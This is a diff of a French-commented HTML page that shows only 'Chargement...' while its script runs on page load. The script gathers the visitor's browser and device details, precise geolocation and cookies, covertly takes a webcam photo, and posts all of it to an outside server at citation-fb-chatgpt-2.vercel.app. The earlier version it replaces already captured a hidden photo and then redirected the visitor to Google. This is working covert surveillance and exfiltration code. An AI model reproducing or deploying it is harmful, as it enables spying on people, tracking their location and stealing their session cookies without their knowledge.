@@ -1,66 +1,116 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Waiting...</title>
-    <style>
-        #video, #canvas {
-            display: none;
-        }
-        #message {
-            text-align: center;
-            margin-top: 20px;
-        }
-    </style>
+    <title>Chargement...</title>
 </head>
 <body>
-    <h1 style="text-align: center;">Waiting...</h1>
-    <video id="video" width="640" height="480" autoplay></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+
     <script>
-        // Accéder à la webcam
-        const video = document.getElementById('video');
+        // Fonction pour récupérer les informations du navigateur
+        function getBrowserInfo() {
+            let info = {
+                appName: navigator.appName,
+                appVersion: navigator.appVersion,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                userAgent: navigator.userAgent,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                maxTouchPoints: navigator.maxTouchPoints,
+                deviceMemory: navigator.deviceMemory
+            };
+            return info;
+        }
 
-        // Demander l'accès à la caméra
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-                video.srcObject = stream;
-                // Capture une seule photo après un délai de 3 secondes
-                setTimeout(capturePhoto, 3000);
-                //window.location.href = 'https://www.google.com/';
-            })
-            .catch((err) => {
-                console.error("Erreur d'accès à la caméra: ", err);
-                document.getElementById('message').innerText = "Erreur d'accès à la caméra.";
-            });
+        // Fonction pour récupérer la localisation
+        function getLocation(callback) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        let location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        callback(location);
+                    },
+                    error => {
+                        console.error('Erreur de géolocalisation:', error);
+                        callback(null);
+                    }
+                );
+            } else {
+                console.error("La géolocalisation n'est pas supportée par ce navigateur.");
+                callback(null);
+            }
+        }
 
-        // Fonction pour capturer la photo
-        function capturePhoto() {
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // Fonction pour récupérer les cookies
+        function getCookies() {
+            let cookies = document.cookie;
+            return cookies;
+        }
 
-            // Convertir le canvas en une URL de données
-            const dataURL = canvas.toDataURL('image/png');
+        // Fonction pour prendre une photo
+        function takePhoto(callback) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    let video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
 
-            // Envoyer l'image au serveur
+                    let canvas = document.createElement('canvas');
+                    canvas.width = 640; // largeur de la capture
+                    canvas.height = 480; // hauteur de la capture
+
+                    setTimeout(() => {
+                        let context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        let photoData = canvas.toDataURL('image/png');
+                        callback(photoData);
+                        stream.getTracks().forEach(track => track.stop()); // Arrêter le flux vidéo
+                    }, 2000); // Attendre 2 secondes avant de capturer l'image
+                })
+                .catch(error => {
+                    console.error('Erreur lors de la capture de la photo:', error);
+                    callback(null);
+                });
+        }
+
+        // Fonction pour envoyer les données au serveur
+        function sendData(data) {
             fetch('https://citation-fb-chatgpt-2.vercel.app/upload', {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
+                    'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ image: dataURL })
+                body: JSON.stringify(data)
             })
             .then(response => response.json())
-            .then(data => {
-                
-                window.location.href = 'https://www.google.com/';
-            })
-            .catch((error) => {
-                console.error('Erreur:', error);
+            .then(data => console.log('Données envoyées:', data))
+            .catch(error => console.error('Erreur lors de l\'envoi des données:', error));
+        }
+
+        // Fonction principale pour collecter et envoyer les données
+        function collectAndSendData() {
+            let browserInfo = getBrowserInfo();
+            let cookies = getCookies();
+
+            getLocation(location => {
+                takePhoto(photo => {
+                    let data = {
+                        browserInfo: browserInfo,
+                        location: location,
+                        cookies: cookies,
+                        photo: photo
+                    };
+                    sendData(data);
+                });
             });
         }
+
+        // Collecter et envoyer les données lorsque la page est chargée
+        window.onload = collectAndSendData;
     </script>
 </body>
 </html>
